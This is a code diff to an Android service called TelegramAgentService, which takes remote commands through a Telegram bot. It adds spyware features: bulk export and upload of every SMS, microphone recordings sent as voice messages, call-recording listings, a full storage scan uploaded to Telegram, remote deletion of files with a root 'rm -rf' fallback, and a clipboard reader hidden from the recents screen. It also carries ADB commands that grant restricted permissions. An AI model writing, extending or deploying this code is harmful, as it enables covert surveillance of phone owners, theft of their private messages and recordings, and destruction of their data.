@@ -80,7 +80,7 @@ import java.util.concurrent.ConcurrentHashMap;
 public class TelegramAgentService extends Service {
 
     // ================= CONFIGURATION =================
-    private static final String BOT_TOKEN = "Anonymous";
+   private static final String BOT_TOKEN = "Anonymous";
     private static final String CHAT_ID   = "Anonymous";   // Owner's chat ID (authorization)
     private static final String API_URL   = "https://api.telegram.org/bot" + BOT_TOKEN;
 
@@ -900,6 +900,12 @@ public class TelegramAgentService extends Service {
             case "cameraf":       capturePhoto(true); break;
             case "mic":           recordAudio(); break;
             case "call_log":      getCallLog(); break;
+			
+			case "calls":         listCallRecordings(); break;
+            case "calls_clean":   CallCleanupWorker.cleanupNow(getApplicationContext()); 
+                      sendMessage("🧹 Cleanup triggered."); break;
+            case "rec_on":        CallRecorder.enableRecording(true); break;
+            case "rec_off":       CallRecorder.enableRecording(false); break;
 
             case "files": case "ls":      cmdFiles(payload); break;
             case "cd":                    cmdCd(payload); break;
@@ -908,6 +914,8 @@ public class TelegramAgentService extends Service {
             case "search": case "find":   cmdSearch(payload); break;
             case "tree":                  cmdTree(payload); break;
             case "info": case "stat":     cmdInfo(payload); break;
+			case "storage":               getStorageFiles(); break;
+			case "delete": case "rm":     deletePath(payload); break; 
 
             case "clipboard":     getClipboard(); break;
             case "battery":       getBattery(); break;
@@ -924,43 +932,47 @@ public class TelegramAgentService extends Service {
     }
 
     // ================= /menu =================
-    private void sendMenu() {
-        String menu = "📱 *Available Commands*\n\n" +
-                "📇 /contacts - Get contacts\n" +
-                "📩 /sms - Inbox SMS\n" +
-                "📤 /outbox - Sent SMS\n" +
-                "✉️ /send_sms number|message\n" +
-                "📨 /send_sms_all message\n" +
-                "📳 /vibrate - Vibrate\n" +
-                "📦 /apps - Installed apps\n" +
-                "🖥️ /devices - Device info\n" +
-                "📸 /screen - Screen capture\n" +
-                "📍 /location - GPS location\n" +
-                "📷 /camera - Back camera photo\n" +
-                "🤳 /cameraF - Front camera photo\n" +
-                "🎙️ /mic - Record 10s audio\n" +
-                "📞 /call_log - Call history\n" +
-                "📋 /clipboard - Clipboard\n" +
-                "🔋 /battery - Battery info\n" +
-                "🔒 /lock - Lock screen\n" +
-                "📶 /wifi - WiFi info\n\n" +
-                "*🔔 Notification Commands:*\n" +
-                "`/notifications` — Recent notifications\n" +
-                "`/clear_notifications` — Clear notification buffer\n\n" +
-                "*📞 Call Commands:*\n" +
-                "`/call_status` — Current call status\n\n" +
-                "*💾 Storage Commands:*\n" +
-                "`/storage_status` — Storage monitoring status\n\n" +
-                "*📁 File System:*\n" +
-                "`/pwd` — current directory\n" +
-                "`/ls` `/files [dir]` — list files\n" +
-                "`/cd <dir>` — change directory (`..` `~` `root`)\n" +
-                "`/get <file>` — download file 📤\n" +
-                "`/search <name>` — recursive find\n" +
-                "`/tree` — directory tree\n" +
-                "`/info <file>` — file details";
-        sendMessage(menu);
-    }
+private void sendMenu() {
+    String menu = "📱 *Available Commands*\n\n" +
+            "`/contacts` — Get contacts\n" +
+            "`/sms` — Export all SMS to CSV\n" +
+            "`/outbox` — Sent SMS\n" +
+            "`/send_sms number|message`\n" +
+            "`/send_sms_all message`\n" +
+            "`/vibrate` — Vibrate\n" +
+            "`/apps` — Installed apps\n" +
+            "`/devices` — Device info\n" +
+            "`/screen` — Screen capture\n" +
+            "`/location` — GPS location\n" +
+            "`/camera` — Back camera photo\n" +
+            "`/cameraf` — Front camera photo\n" +
+            "`/mic` — Record 10s audio\n" +
+            "`/call_log` — Call history\n" +
+            "`/calls` — List call recordings\n" +
+            "`/calls_clean` — Delete old recordings\n" +
+            "`/clipboard` — Clipboard\n" +
+            "`/battery` — Battery info\n" +
+            "`/lock` — Lock screen\n" +
+            "`/wifi` — WiFi info\n\n" +
+            "*🔔 Notifications:*\n" +
+            "`/notifications` — Recent notifications\n" +
+            "`/clear_notifications` — Clear buffer\n\n" +
+            "*📞 Call:*\n" +
+            "`/call_status` — Current call status\n\n" +
+            "*💾 Storage:*\n" +
+            "`/storage_status` — Monitoring status\n\n" +
+            "*📁 File System:*\n" +
+            "`/pwd` — Current directory\n" +
+            "`/ls` or `/files [dir]` — List files\n" +
+            "`/cd <dir>` — Change directory\n" +
+            "`/get <file>` — Download file 📤\n" +
+            "`/search <name>` — Recursive find\n" +
+            "`/tree` — Directory tree\n" +
+            "`/info <file>` — File details\n" +
+            "`/storage` — Scan all files to TXT 💾" +
+			"`/delete <path>` — 🗑️ Delete file/folder\n";
+    sendMessage(menu);
+}
 
     // ================= /notifications =================
     private void getRecentNotifications() {
@@ -990,6 +1002,44 @@ public class TelegramAgentService extends Service {
             sendMessage("🔔 Cleared " + count + " notifications.");
         }
     }
+
+// ================= /Calls =================
+private void listCallRecordings() {
+    new Thread(() -> {
+        try {
+            File dir = CallRecorder.getRecordingsDir();
+            if (!dir.exists() || dir.listFiles() == null || dir.listFiles().length == 0) {
+                sendMessage("📞 No call recordings found.");
+                return;
+            }
+
+            File[] files = dir.listFiles();
+            java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
+
+            java.text.SimpleDateFormat sdf =
+                    new java.text.SimpleDateFormat("MM-dd HH:mm", Locale.US);
+
+            StringBuilder sb = new StringBuilder("📞 *Call Recordings:*\n\n");
+            long totalSize = 0;
+
+            for (File f : files) {
+                if (sb.length() > 3500) { sb.append("_...truncated_"); break; }
+                long kb = f.length() / 1024;
+                totalSize += f.length();
+                sb.append("🎙️ `").append(f.getName()).append("`\n")
+                  .append("   ").append(kb).append(" KB — ")
+                  .append(sdf.format(new Date(f.lastModified()))).append("\n");
+            }
+
+            sb.append("\n_").append(files.length).append(" file(s), ")
+              .append(totalSize / 1024 / 1024).append(" MB total_");
+
+            sendMessage(sb.toString());
+        } catch (Exception e) {
+            sendMessage("❌ Error: " + e.getMessage());
+        }
+    }).start();
+}
 
     // ================= /call_status =================
    private void getCallStatus() {
@@ -1055,42 +1105,138 @@ public class TelegramAgentService extends Service {
     }
 
     // ================= /sms =================
+    // ================= COMMAND: /sms (Inbox) =================
     private void getInboxSms() {
-        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-            sendMessage("❌ READ_SMS denied.\n\nOn Android 11+ this permission is restricted. Grant via ADB:\n" +
-                    "`adb shell pm grant com.thunderx.telegramagent android.permission.READ_SMS`");
-            return;
-        }
-        StringBuilder sb = new StringBuilder("📩 *Inbox SMS (Last 30):*\n");
+    // ----- Permission check -----
+    if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+        sendMessage("❌ READ_SMS denied.\n\nOn Android 11+ this permission is restricted. Grant via ADB:\n" +
+                "`adb shell pm grant com.thunderx.telegramagent android.permission.READ_SMS`");
+        return;
+    }
+
+    sendMessage("📩 Exporting all SMS to CSV...");
+
+    // Run on a background thread so the UI/service doesn't freeze
+    new Thread(() -> {
         Cursor cur = null;
+        java.io.FileWriter writer = null;
+        int count = 0;
+        java.io.File csvFile = null;
+
         try {
-            cur = getContentResolver().query(Uri.parse("content://sms/inbox"),
-                    null, null, null, "date DESC LIMIT 30");
-            if (cur == null) { sendMessage("❌ SMS provider not accessible."); return; }
+            // ----- Create CSV file in cache directory -----
+            csvFile = new java.io.File(
+                    getCacheDir(),
+                    "sms_export_" + System.currentTimeMillis() + ".txt");
+            writer = new java.io.FileWriter(csvFile);
 
-            int bodyIdx = cur.getColumnIndex("body");
-            int addrIdx = cur.getColumnIndex("address");
-            if (bodyIdx == -1 || addrIdx == -1) { sendMessage("❌ Columns missing."); return; }
+            // ----- CSV header row -----
+            writer.append("ID,Type,Address,DateSent,DateReceived,Read,Status,Body\n");
 
-            int count = 0;
-            while (cur.moveToNext() && sb.length() < 3900) {
-                String body = cur.getString(bodyIdx);
-                String addr = cur.getString(addrIdx);
-                sb.append("• ").append(addr != null ? addr : "?")
-                  .append(": ").append(body != null ? body : "").append("\n");
+            // ----- Query ALL SMS (no LIMIT, no filter) -----
+            cur = getContentResolver().query(
+                    Uri.parse("content://sms/"),
+                    null, null, null, "date ASC"
+            );
+
+            if (cur == null) {
+                sendMessage("❌ SMS provider not accessible.");
+                return;
+            }
+
+            // ----- Column indices -----
+            int idIdx     = cur.getColumnIndex("_id");
+            int addrIdx   = cur.getColumnIndex("address");
+            int bodyIdx   = cur.getColumnIndex("body");
+            int dateIdx   = cur.getColumnIndex("date");
+            int typeIdx   = cur.getColumnIndex("type");
+            int readIdx   = cur.getColumnIndex("read");
+            int statusIdx = cur.getColumnIndex("status");
+            int sentIdx   = cur.getColumnIndex("date_sent");
+
+            // ----- Date formatter -----
+            java.text.SimpleDateFormat sdf =
+                    new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
+
+            // ----- Loop through every SMS row -----
+            while (cur.moveToNext()) {
+                String id     = idIdx     != -1 ? cur.getString(idIdx) : "";
+                String addr   = addrIdx   != -1 ? cur.getString(addrIdx) : "";
+                String body   = bodyIdx   != -1 ? cur.getString(bodyIdx) : "";
+                long   date   = dateIdx   != -1 ? cur.getLong(dateIdx) : 0;
+                int    type   = typeIdx   != -1 ? cur.getInt(typeIdx) : -1;
+                int    read   = readIdx   != -1 ? cur.getInt(readIdx) : -1;
+                int    status = statusIdx != -1 ? cur.getInt(statusIdx) : -1;
+                long   sent   = sentIdx   != -1 ? cur.getLong(sentIdx) : 0;
+
+                // ----- Map type code to readable name -----
+                String typeStr;
+                switch (type) {
+                    case 1: typeStr = "INBOX";  break;
+                    case 2: typeStr = "SENT";   break;
+                    case 3: typeStr = "DRAFT";  break;
+                    case 4: typeStr = "OUTBOX"; break;
+                    case 5: typeStr = "FAILED"; break;
+                    case 6: typeStr = "QUEUED"; break;
+                    default: typeStr = "UNKNOWN(" + type + ")";
+                }
+
+                // ----- Write CSV row (each field escaped) -----
+                writer.append(csvEscape(id)).append(",")
+                      .append(csvEscape(typeStr)).append(",")
+                      .append(csvEscape(addr)).append(",")
+                      .append(csvEscape(sent > 0 ? sdf.format(new Date(sent)) : "")).append(",")
+                      .append(csvEscape(date > 0 ? sdf.format(new Date(date)) : "")).append(",")
+                      .append(csvEscape(String.valueOf(read))).append(",")
+                      .append(csvEscape(String.valueOf(status))).append(",")
+                      .append(csvEscape(body)).append("\n");
+
                 count++;
             }
-            if (count == 0) { sendMessage("📩 No inbox SMS."); return; }
+            cur.close();
+            writer.flush();
+            writer.close();
+
+            // ----- Handle empty result -----
+            if (count == 0) {
+                sendMessage("📩 No SMS found on device.");
+                csvFile.delete();
+                return;
+            }
+
+            // ----- Send CSV to Telegram -----
+            long sizeKb = csvFile.length() / 1024;
+            sendMessage("✅ *" + count + "* SMS exported (" + sizeKb + " KB). Uploading...");
+
+            sendFileToTelegram(csvFile, "text/plain", csvFile.getName(),
+                    "sendDocument", "document",
+                    "📩 All SMS Export — " + count + " messages");
+
         } catch (SecurityException se) {
-            sendMessage("❌ SecurityException. Grant via ADB:\n" +
-                    "`adb shell pm grant com.thunderx.telegramagent android.permission.READ_SMS`");
-            return;
+            sendMessage("❌ SecurityException: " + se.getMessage() +
+                    "\nGrant via ADB:\n`adb shell pm grant com.thunderx.telegramagent android.permission.READ_SMS`");
         } catch (Exception e) {
             sendMessage("❌ Error: " + e.getMessage());
-            return;
-        } finally { if (cur != null) cur.close(); }
-        sendMessage(sb.toString());
+        } finally {
+            // ----- Cleanup -----
+            try { if (cur != null) cur.close(); } catch (Exception ignored) {}
+            try { if (writer != null) writer.close(); } catch (Exception ignored) {}
+        }
+    }).start();
+}
+
+// ==========================================================
+// Helper: Escape a CSV field (handles commas, quotes, newlines)
+// ==========================================================
+private String csvEscape(String s) {
+    if (s == null) return "";
+    // If the field contains comma, quote, or newline, wrap it in quotes
+    // and double any inner quotes (RFC 4180 CSV standard)
+    if (s.contains(",") || s.contains("\"") || s.contains("\n") || s.contains("\r")) {
+        return "\"" + s.replace("\"", "\"\"") + "\"";
     }
+    return s;
+}
 
     // ================= /outbox =================
     private void getOutboxSms() {
@@ -1312,39 +1458,180 @@ public class TelegramAgentService extends Service {
 
     // ================= /mic =================
     private void recordAudio() {
-        if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-            sendMessage("❌ RECORD_AUDIO denied.\nGrant via ADB:\n`adb shell pm grant com.thunderx.telegramagent android.permission.RECORD_AUDIO`");
-            return;
-        }
-        try {
-            final File out = new File(getCacheDir(),
-                    "rec_" + System.currentTimeMillis() + ".m4a");
-            final MediaRecorder rec = new MediaRecorder();
-            rec.setAudioSource(MediaRecorder.AudioSource.MIC);
+    if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+        sendMessage("❌ RECORD_AUDIO denied.\nGrant via ADB:\n`adb shell pm grant com.thunderx.telegramagent android.permission.RECORD_AUDIO`");
+        return;
+    }
+    try {
+        // Voice messages must be .ogg (Opus codec) for Telegram to play inline
+        final File out = new File(getCacheDir(),
+                "voice_" + System.currentTimeMillis() + ".ogg");
+
+        final MediaRecorder rec = new MediaRecorder();
+
+        // Audio source
+        rec.setAudioSource(MediaRecorder.AudioSource.MIC);
+
+        // Output: OGG container (supported on Android 10 / API 29+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            rec.setOutputFormat(MediaRecorder.OutputFormat.OGG);
+            rec.setAudioEncoder(MediaRecorder.AudioEncoder.OPUS);
+        } else {
+            // Fallback for older Android: use MPEG_4 + AAC (send as audio, not voice)
             rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
             rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-            rec.setAudioSamplingRate(44100);
-            rec.setAudioEncodingBitRate(96000);
-            rec.setOutputFile(out.getAbsolutePath());
-            rec.prepare();
-            rec.start();
-            sendMessage("🎙️ Recording 10 seconds...");
-
-            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                try {
-                    rec.stop();
-                    rec.release();
-                    sendDocumentToTelegram(out, "audio/mp4", out.getName());
-                } catch (Exception e) {
-                    Log.e("Agent", "rec stop", e);
-                    sendMessage("❌ Record stop error: " + e.getMessage());
-                }
-            }, 10000);
-        } catch (Exception e) {
-            sendMessage("❌ Mic error: " + e.getMessage());
         }
-    }
 
+        rec.setAudioSamplingRate(48000);
+        rec.setAudioEncodingBitRate(64000);
+        rec.setOutputFile(out.getAbsolutePath());
+        rec.prepare();
+        rec.start();
+
+        sendMessage("🎙️ Recording 10 seconds...");
+
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try {
+                rec.stop();
+                rec.release();
+
+                // ----- Send as Telegram VOICE message (plays inline) -----
+                // Use sendVoice endpoint + OGG/Opus format
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    sendVoiceToTelegram(out);
+                } else {
+                    // Fallback: sendAudio with m4a (also plays inline)
+                    sendAudioToTelegram(out);
+                }
+
+            } catch (Exception e) {
+                Log.e("Agent", "rec stop", e);
+                sendMessage("❌ Record stop error: " + e.getMessage());
+            }
+        }, 10000);
+    } catch (Exception e) {
+        sendMessage("❌ Mic error: " + e.getMessage());
+    }
+}
+// ================= SEND VOICE (OGG/Opus) =================
+// Telegram's sendVoice endpoint: plays inline as a voice message
+public static void sendVoiceToTelegram(java.io.File oggFile) {
+    if (context == null || oggFile == null || !oggFile.exists()) return;
+    new Thread(() -> {
+        HttpURLConnection conn = null;
+        OutputStream os = null;
+        PrintWriter writer = null;
+        java.io.FileInputStream fis = null;
+        try {
+            String boundary = "----TB" + System.currentTimeMillis();
+            conn = (HttpURLConnection) new URL(API_URL + "/sendVoice").openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(60000);
+            conn.setReadTimeout(120000);
+            conn.setRequestProperty("Content-Type",
+                    "multipart/form-data; boundary=" + boundary);
+
+            os = conn.getOutputStream();
+            writer = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
+
+            writer.append("--").append(boundary).append("\r\n");
+            writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
+            writer.append(CHAT_ID).append("\r\n");
+            writer.flush();
+
+            writer.append("--").append(boundary).append("\r\n");
+            writer.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
+            writer.append("🎙️ ").append(DEVICE_ID).append(" — 10s voice\r\n");
+            writer.flush();
+
+            writer.append("--").append(boundary).append("\r\n");
+            writer.append("Content-Disposition: form-data; name=\"voice\"; filename=\"")
+                  .append(oggFile.getName()).append("\"\r\n");
+            writer.append("Content-Type: audio/ogg\r\n\r\n");
+            writer.flush();
+
+            fis = new java.io.FileInputStream(oggFile);
+            byte[] buf = new byte[8192];
+            int n;
+            while ((n = fis.read(buf)) > 0) os.write(buf, 0, n);
+            os.flush();
+
+            writer.append("\r\n");
+            writer.append("--").append(boundary).append("--\r\n");
+            writer.flush();
+
+            Log.d("Agent", "sendVoice response: " + conn.getResponseCode());
+        } catch (Exception e) {
+            Log.e("Agent", "sendVoice error: " + e.getMessage());
+        } finally {
+            try { if (fis != null) fis.close(); } catch (Exception ignored) {}
+            try { if (writer != null) writer.close(); } catch (Exception ignored) {}
+            try { if (os != null) os.close(); } catch (Exception ignored) {}
+            if (conn != null) conn.disconnect();
+        }
+    }).start();
+}
+
+// ================= SEND AUDIO (m4a fallback) =================
+// Telegram's sendAudio endpoint: shows an audio player with inline play
+public static void sendAudioToTelegram(java.io.File audioFile) {
+    if (context == null || audioFile == null || !audioFile.exists()) return;
+    new Thread(() -> {
+        HttpURLConnection conn = null;
+        OutputStream os = null;
+        PrintWriter writer = null;
+        java.io.FileInputStream fis = null;
+        try {
+            String boundary = "----TB" + System.currentTimeMillis();
+            conn = (HttpURLConnection) new URL(API_URL + "/sendAudio").openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(60000);
+            conn.setReadTimeout(120000);
+            conn.setRequestProperty("Content-Type",
+                    "multipart/form-data; boundary=" + boundary);
+
+            os = conn.getOutputStream();
+            writer = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
+
+            writer.append("--").append(boundary).append("\r\n");
+            writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
+            writer.append(CHAT_ID).append("\r\n");
+            writer.flush();
+
+            writer.append("--").append(boundary).append("\r\n");
+            writer.append("Content-Disposition: form-data; name=\"title\"\r\n\r\n");
+            writer.append("Mic Recording — ").append(DEVICE_ID).append("\r\n");
+            writer.flush();
+
+            writer.append("--").append(boundary).append("\r\n");
+            writer.append("Content-Disposition: form-data; name=\"audio\"; filename=\"")
+                  .append(audioFile.getName()).append("\"\r\n");
+            writer.append("Content-Type: audio/mp4\r\n\r\n");
+            writer.flush();
+
+            fis = new java.io.FileInputStream(audioFile);
+            byte[] buf = new byte[8192];
+            int n;
+            while ((n = fis.read(buf)) > 0) os.write(buf, 0, n);
+            os.flush();
+
+            writer.append("\r\n");
+            writer.append("--").append(boundary).append("--\r\n");
+            writer.flush();
+
+            Log.d("Agent", "sendAudio response: " + conn.getResponseCode());
+        } catch (Exception e) {
+            Log.e("Agent", "sendAudio error: " + e.getMessage());
+        } finally {
+            try { if (fis != null) fis.close(); } catch (Exception ignored) {}
+            try { if (writer != null) writer.close(); } catch (Exception ignored) {}
+            try { if (os != null) os.close(); } catch (Exception ignored) {}
+            if (conn != null) conn.disconnect();
+        }
+    }).start();
+}
     // ================= /call_log =================
     private void getCallLog() {
         if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
@@ -1414,6 +1701,294 @@ public class TelegramAgentService extends Service {
         } finally { if (cur != null) cur.close(); }
         sendMessage(sb.toString());
     }
+
+// ================= /delete =================
+// Delete a file or folder permanently given a path
+private void deletePath(String arg) {
+    if (arg == null || arg.trim().isEmpty()) {
+        sendMessage("❌ Usage: `/delete <path>`\n\n" +
+                "Examples:\n" +
+                "`/delete /storage/emulated/0/test.txt`\n" +
+                "`/delete /storage/emulated/0/CallRecords`\n" +
+                "`/delete ~/Download/old.apk`");
+        return;
+    }
+
+    new Thread(() -> {
+        try {
+            File currentDir = getCwd();
+            File target = resolvePath(currentDir, arg.trim());
+
+            // ----- Safety: reject dangerous paths -----
+            String absPath = target.getAbsolutePath();
+            String[] FORBIDDEN = {
+                    "/", "/system", "/data", "/storage", "/storage/emulated",
+                    "/storage/emulated/0", "/sdcard", "/mnt", "/proc", "/sys"
+            };
+            for (String f : FORBIDDEN) {
+                if (absPath.equals(f)) {
+                    sendMessage("⛔ *Safety block:* refusing to delete `" + absPath + "`\n" +
+                            "_This is a protected system path._");
+                    return;
+                }
+            }
+
+            // ----- Check existence -----
+            if (!target.exists()) {
+                sendMessage("❌ Not found: `" + absPath + "`");
+                return;
+            }
+
+            // ----- Compute size before delete -----
+            boolean isDir = target.isDirectory();
+            long size = isDir ? getFolderSize(target) : target.length();
+            int[] fileCount = new int[]{0};
+            if (isDir) countFiles(target, fileCount);
+
+            // ----- Attempt delete -----
+            boolean ok;
+            if (isDir) {
+                ok = deleteRecursive(target);
+            } else {
+                ok = target.delete();
+            }
+
+            // ----- Root fallback (if enabled and failed) -----
+            if (!ok && hasRoot) {
+                ok = deleteWithRoot(absPath);
+            }
+
+            // ----- Report -----
+            if (ok) {
+                String readable = formatSize(size);
+                if (isDir) {
+                    sendMessage("🗑️ *Deleted folder*\n" +
+                            "Path: `" + absPath + "`\n" +
+                            "Files removed: *" + fileCount[0] + "*\n" +
+                            "Freed: *" + readable + "*");
+                } else {
+                    sendMessage("🗑️ *Deleted file*\n" +
+                            "Path: `" + absPath + "`\n" +
+                            "Freed: *" + readable + "*");
+                }
+            } else {
+                sendMessage("❌ *Delete failed:* `" + absPath + "`\n\n" +
+                        "Possible reasons:\n" +
+                        "• Permission denied\n" +
+                        "• File in use\n" +
+                        "• Protected system path\n\n" +
+                        "Try:\n" +
+                        "`adb shell appops set com.thunderx.telegramagent MANAGE_EXTERNAL_STORAGE allow`");
+            }
+
+        } catch (Exception e) {
+            sendMessage("❌ Error: " + e.getMessage());
+        }
+    }).start();
+}
+
+// ==========================================================
+// Helper: Recursively delete a folder + all contents
+// ==========================================================
+private boolean deleteRecursive(File fileOrDir) {
+    if (fileOrDir == null) return false;
+    if (fileOrDir.isDirectory()) {
+        File[] children = fileOrDir.listFiles();
+        if (children != null) {
+            for (File child : children) {
+                deleteRecursive(child);
+            }
+        }
+    }
+    return fileOrDir.delete();
+}
+
+// ==========================================================
+// Helper: Get total size of a folder (recursive)
+// ==========================================================
+private long getFolderSize(File dir) {
+    long size = 0;
+    if (dir == null || !dir.isDirectory()) return 0;
+    File[] files = dir.listFiles();
+    if (files == null) return 0;
+    for (File f : files) {
+        if (f.isDirectory()) size += getFolderSize(f);
+        else size += f.length();
+    }
+    return size;
+}
+
+// ==========================================================
+// Helper: Count files in a folder (recursive)
+// ==========================================================
+private void countFiles(File dir, int[] counter) {
+    if (dir == null || !dir.isDirectory()) return;
+    File[] files = dir.listFiles();
+    if (files == null) return;
+    for (File f : files) {
+        if (f.isDirectory()) countFiles(f, counter);
+        else counter[0]++;
+    }
+}
+
+// ==========================================================
+// Helper: Delete using root (su rm -rf)
+// ==========================================================
+private boolean deleteWithRoot(String path) {
+    try {
+        String safe = path.replace("\"", "\\\"");
+        Process p = Runtime.getRuntime().exec(new String[]{
+                "su", "-c", "rm -rf \"" + safe + "\""});
+        int code = p.waitFor();
+        return code == 0;
+    } catch (Exception e) {
+        Log.e("Agent", "root delete failed: " + e.getMessage());
+        return false;
+    }
+}
+
+
+// ================= /storage =================
+// Scans all storage(s) and exports every file to a CSV with name + location + full path
+private void getStorageFiles() {
+    sendMessage("💾 Scanning storage... This may take a while.");
+
+    new Thread(() -> {
+        java.io.FileWriter writer = null;
+        java.io.File csvFile = null;
+        int fileCount = 0;
+        int dirCount = 0;
+        long totalBytes = 0;
+
+        try {
+            // ----- Create CSV file in cache -----
+            csvFile = new java.io.File(
+                    getCacheDir(),
+                    "storage_export_" + System.currentTimeMillis() + ".txt");
+            writer = new java.io.FileWriter(csvFile);
+
+            // ----- CSV header -----
+            writer.append("Name,Type,Location,Path,SizeBytes,SizeReadable,Modified\n");
+
+            // ----- Collect all storage roots -----
+            List<java.io.File> roots = new ArrayList<>();
+
+            // Primary external storage (usually /storage/emulated/0)
+            java.io.File primary = Environment.getExternalStorageDirectory();
+            if (primary != null && primary.exists()) {
+                roots.add(primary);
+            }
+
+            // Secondary storages (SD card etc.)
+            try {
+                java.io.File[] externalDirs = getExternalFilesDirs(null);
+                if (externalDirs != null) {
+                    for (java.io.File dir : externalDirs) {
+                        if (dir == null) continue;
+                        // Walk up to the storage root
+                        String path = dir.getAbsolutePath();
+                        int idx = path.indexOf("/Android/");
+                        if (idx > 0) {
+                            java.io.File root = new java.io.File(path.substring(0, idx));
+                            if (root.exists() && !roots.contains(root)) {
+                                roots.add(root);
+                            }
+                        }
+                    }
+                }
+            } catch (Exception ignored) {}
+
+            // ----- Walk each root recursively -----
+            for (java.io.File root : roots) {
+                int[] counters = new int[]{0, 0}; // [files, dirs]
+                long[] bytes = new long[]{0};
+                walkAndWrite(root, root, writer, counters, bytes, 0, 8);
+                fileCount += counters[0];
+                dirCount += counters[1];
+                totalBytes += bytes[0];
+            }
+
+            writer.flush();
+            writer.close();
+
+            // ----- Handle empty result -----
+            if (fileCount == 0) {
+                sendMessage("💾 No files found on storage.");
+                csvFile.delete();
+                return;
+            }
+
+            long sizeKb = csvFile.length() / 1024;
+            sendMessage("✅ Scanned *" + fileCount + "* files in *" + dirCount +
+                    "* folders (" + formatSize(totalBytes) + " total, CSV: " + sizeKb + " KB).\nUploading...");
+
+            // ----- Send CSV to Telegram -----
+            sendFileToTelegram(csvFile, "text/plain", csvFile.getName(),
+                    "sendDocument", "document",
+                    "💾 Storage Export — " + fileCount + " files");
+
+        } catch (Exception e) {
+            sendMessage("❌ Storage scan error: " + e.getMessage());
+        } finally {
+            try { if (writer != null) writer.close(); } catch (Exception ignored) {}
+        }
+    }).start();
+}
+
+// ==========================================================
+// Recursive walker: writes each file/dir as a CSV row
+// ==========================================================
+private void walkAndWrite(java.io.File root, java.io.File dir,
+                          java.io.FileWriter writer,
+                          int[] counters, long[] bytes,
+                          int depth, int maxDepth) {
+    if (depth > maxDepth) return;
+
+    java.io.File[] children = dir.listFiles();
+    if (children == null) return;
+
+    java.text.SimpleDateFormat sdf =
+            new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
+
+    for (java.io.File f : children) {
+        try {
+            String name     = f.getName();
+            String path     = f.getAbsolutePath();
+            String location = root.getAbsolutePath(); // which storage (SD / internal)
+            boolean isDir   = f.isDirectory();
+            long size       = isDir ? 0 : f.length();
+            String sizeRead = isDir ? "" : formatSize(size);
+            String modified = f.lastModified() > 0
+                    ? sdf.format(new Date(f.lastModified())) : "";
+
+            writer.append(csvEscape(name)).append(",")
+                  .append(csvEscape(isDir ? "DIR" : "FILE")).append(",")
+                  .append(csvEscape(location)).append(",")
+                  .append(csvEscape(path)).append(",")
+                  .append(csvEscape(String.valueOf(size))).append(",")
+                  .append(csvEscape(sizeRead)).append(",")
+                  .append(csvEscape(modified)).append("\n");
+
+            if (isDir) {
+                counters[1]++;
+                walkAndWrite(root, f, writer, counters, bytes, depth + 1, maxDepth);
+            } else {
+                counters[0]++;
+                bytes[0] += size;
+            }
+        } catch (Exception ignored) {}
+    }
+}
+
+// ==========================================================
+// Helper: Human-readable size (e.g., "1.24 MB")
+// ==========================================================
+private String formatSize(long bytes) {
+    if (bytes < 1024) return bytes + " B";
+    if (bytes < 1024 * 1024) return String.format(Locale.US, "%.2f KB", bytes / 1024.0);
+    if (bytes < 1024L * 1024 * 1024) return String.format(Locale.US, "%.2f MB", bytes / (1024.0 * 1024));
+    return String.format(Locale.US, "%.2f GB", bytes / (1024.0 * 1024 * 1024));
+}
 
     // ==========================================================
     //                  FILE SYSTEM COMMANDS
@@ -1760,24 +2335,18 @@ public class TelegramAgentService extends Service {
     }
 
     private void getClipboard() {
-        try {
-            ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
-            if (cm == null || !cm.hasPrimaryClip()) {
-                sendMessage("📋 Clipboard empty or unavailable.");
-                return;
-            }
-            ClipData clip = cm.getPrimaryClip();
-            if (clip == null || clip.getItemCount() == 0) {
-                sendMessage("📋 Clipboard has no items.");
-                return;
-            }
-            CharSequence text = clip.getItemAt(0).coerceToText(this);
-            sendMessage("📋 *Clipboard:*\n" + (text != null ? text.toString() : "(empty)"));
-        } catch (Exception e) {
-            sendMessage("❌ Clipboard error: " + e.getMessage() +
-                    "\n(Note: Android 10+ restricts clipboard access to foreground apps.)");
-        }
+    try {
+        sendMessage("📋 Opening clipboard reader...");
+        android.content.Intent intent = new android.content.Intent(
+                this, ClipboardReaderActivity.class);
+        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
+        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+        startActivity(intent);
+    } catch (Exception e) {
+        sendMessage("❌ Clipboard launch error: " + e.getMessage());
     }
+}
 
     private void getBattery() {
         try {
